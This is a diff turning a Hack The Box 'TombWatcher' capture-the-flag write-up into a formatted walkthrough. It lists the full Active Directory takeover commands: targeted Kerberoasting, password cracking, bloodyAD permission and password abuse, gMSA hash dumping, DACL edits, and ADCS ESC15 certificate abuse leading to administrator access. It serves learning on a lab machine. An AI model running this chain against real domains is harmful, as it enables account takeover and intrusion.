@@ -1,86 +1,165 @@
-Machine info: TombWatcher.htb (Windows) 
+# TombWatcher HTB – Pentest Walkthrough
 
-Default creds: henry/h3nry_987TGV!
+**Target:** Windows Machine  
 
-I first started off with a simple network scan to identify any open ports / services and their service versions
-this returned a list of open ports of course, port 5985 was open - WinRM exist, might be vulnerable. 
+---
 
-I checked the HTTP ports, 80 in this case. there was nothing of much interest. 
+## Reconnaissance  
 
-I used bloodhound to get a clearer picture of the user's AD enviroment and their current
-privs, and found out that Henry has WriteSPB permissions to the user Alfred.
+Performed an initial Nmap scan to find open ports and services:
 
-I downloaded a tool called targetedKerberoast, gave the domain, user, and password
-and this successfully dumped alfreds password hash. 
+```bash
+nmap -sC -sV 10.10.11.72
 
-I put the hash into a file called hash.txt, used john to blast it, and received the 
-password 'basketball'
+    Port 5985 (WinRM) open (prime candidate for exploitation).
 
-I ran bloodhound again, but this time as alfred, Alfred has AddSelf permissions to 
-the group INFRASTRUCTURE, so I used bloodyAD; provided the DC address, domain, user,
-password and then 'add groupMember INFRASTRUCTURE alfred' to add alfred to the group :)
+    Default credentials:
 
-using bloodhound, I also figured out that the user ansible_dev$ has ReadGMSAPassword
-permissions and is apart of the infrastructure group aswell. 
+    henry : h3nry_987TGV!
 
-I used a tool called gMSADumper to dump ansibles hash, then I used his hash to run 
-an instance of bloodhound for further enumeration. 
+Checked HTTP service on port 80 but found nothing noteworthy.
+Initial Enumeration – Henry
 
-ansible has ForceChangePassword permissions for the user account Sam, so I used
-bloodyAD to change Sams password to 'Abc123456!' for simplicity ;)
+Used BloodHound to map the AD environment.
 
-I used bloodhound again, this time for sam, and found that sam had WriteOwner
-permissions to a user called John, so I used bloodyAD to make Sam the new owner of 
-John's account, then I gave Sam GenericAll permissions to John's account. 
+Findings:
 
-I then simply changed John's password, used evil-winrm to log in, and navigated to 
-John's Desktop, and received the user.txt flag!
+    henry has WriteSPN permissions over alfred.
 
-Privilege Escalation:
+Kerberoasting Alfred
 
-I noticed that in bloodhound, John has GenericAll permissions to the OU ADCS.
-Knowing this, I used impacket-dacledit to give John full control of the OU as-well 
-as Read/Write permissions.
+Used targetedKerberoast to dump Alfred’s hash:
 
-There were two users: cert_admin, and cert_adm. I targeted cert_admin because
-John has GenericAll permissions for that account. I used bloodyAD to changed
-cert_admins password, it was successful but I was given this error: 
-No object found in DC=tombwatcher,DC=htb with filter: (sAMAccountName=cert_admin).
+targetedKerberoast.py -d tombwatcher.htb -u henry -p 'h3nry_987TGV!'
 
-I got stuck at this point because I didn't know what to do, but with a quick 
-google search, I found out all I had to do was restore the account via the 
-Powershell I established connecting to the john account, so I used these commmands:
+Saved the hash to hash.txt and cracked it with John the Ripper:
+
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+
+Result:
+
+alfred : basketball
+
+Escalating via Alfred
+
+Re-ran BloodHound as Alfred.
+
+Findings:
+
+    Alfred has AddSelf permission to the INFRASTRUCTURE group.
+
+Added Alfred to the group:
+
+bloodyAD --host '10.10.11.72' -d tombwatcher.htb \
+-u 'alfred' -p 'basketball' \
+add groupMember INFRASTRUCTURE alfred
+
+Targeting Ansible Account
+
+Findings:
+
+    ansible_dev$ has ReadGMSAPassword and is a member of INFRASTRUCTURE.
+
+Dumped Ansible’s hash:
+
+gMSADumper.py -u alfred -p basketball -d tombwatcher.htb
+
+Used Ansible’s credentials for deeper enumeration.
+Escalating to Sam
+
+BloodHound revealed:
+
+    Ansible has ForceChangePassword permission for sam.
+
+Reset Sam’s password:
+
+bloodyAD --host '10.10.11.72' -d tombwatcher.htb \
+-u 'ansible_dev$' -H '<HASH>' \
+set password sam 'Abc123456!'
+
+Pivoting to John
+
+With Sam’s credentials:
+
+    Sam has WriteOwner over john.
+
+Steps:
+
+    Made Sam the owner of John’s account.
+
+    Granted Sam GenericAll over John.
+
+    Changed John’s password.
+
+Logged in as John with Evil-WinRM:
+
+evil-winrm -i 10.10.11.72 -u john -p '<NEWPASSWORD>'
+
+Grabbed user.txt.
+Privilege Escalation
+ADCS OU Control
+
+BloodHound showed John had GenericAll over ADCS OU.
+
+Gained full control with impacket-dacledit:
+
+impacket-dacledit -action write -rights FullControl \
+-principal john -target-ou "OU=ADCS,DC=tombwatcher,DC=htb"
+
+Restoring Cert_Admin
+
+Found cert_admin was deleted.
+
+Restored and reset password via PowerShell:
+
 Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects
-
-which gave me a list of deleted user accounts, one of them was cert_admin, so I 
-restored the account, enabled it, and reset the password. 
-
 Restore-ADObject -Identity 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
 Enable-ADAccount -Identity cert_admin
-Set-ADAccountPassword -Identity cert_admin -Reset -NewPassword 
+Set-ADAccountPassword -Identity cert_admin -Reset -NewPassword `
 (ConvertTo-SecureString "Abc123456@" -AsPlainText -Force)
 
-I used certipy to find any vulns within the certificate services and 
-found that ESC15 was in use. 
+Certificate Services Exploit (ESC15)
 
-I did a quick lookup, and it turns out that this is vulnerable to RCE! 
+Enumerated certificate services:
 
-I then used this command to request a certificate for the admin account:
+certipy find -u 'cert_admin@tombwatcher.htb' -p 'Abc123456@' \
+-dc-ip 10.10.11.72
+
+Found ESC15 vulnerability (RCE).
+
+Requested a certificate for Administrator:
 
 certipy req \
-    -u 'cert_admin@tombwatcher.htb' -p 'Abc123456@' \
-    -dc-ip '10.10.11.72' -target 'DC01.tombwatcher.htb' \
-    -ca 'tombwatcher-CA-1' -template 'WebServer' \
-    -upn 'administrator@tombwatcher.htb'  \
-    -application-policies 'Client Authentication'
+-u 'cert_admin@tombwatcher.htb' -p 'Abc123456@' \
+-dc-ip '10.10.11.72' -target 'DC01.tombwatcher.htb' \
+-ca 'tombwatcher-CA-1' -template 'WebServer' \
+-upn 'administrator@tombwatcher.htb' \
+-application-policies 'Client Authentication'
 
-I then authecticated and started a ldap shell:
-certipy auth -pfx 'administrator.pfx' -dc-ip '10.10.11.72' -ldap-shell
+Authenticated via LDAP shell:
 
-once I was logged in via the shell, I changed the password for the admin account.
+certipy auth -pfx administrator.pfx -dc-ip 10.10.11.72 -ldap-shell
 
-once the password was changed, I used evil-winrm to login as admin, I navigated
-to admins Desktop, and retrieved the root.txt flag!
+Changed Administrator’s password.
+Root Access
 
+Logged in as Administrator:
 
+evil-winrm -i 10.10.11.72 -u 'administrator' -p '<NEWPASSWORD>'
 
+Retrieved root.txt.
+Key Takeaways
+
+    Layered Privilege Escalation: Excellent example of chaining user permissions to pivot. 
+    I really enjoy these types of boxes that require me to think about lateral escalation!
+    It's great practice for really understanding how tools are used in what type of situation, why they are needed,
+    and how to use them!
+
+    AD Object Restoration: Restoring deleted accounts was essential. This was unfamilar to me; using google saved me
+    though, and the solution was easier than i'd thought. 
+
+    Certificate Abuse (ESC15): Misconfigured ADCS enabled domain admin takeover. 
+
+    Enumeration Wins: BloodHound and Certipy were critical tools in this engagement. I used bloodhound a lot in this 
+    machine! Bloodhound is one of those tools you have to have equipped on you for use when dealing with AD
+    in my opinion. It makes a greate enumeration tool and hasn't failed me. 
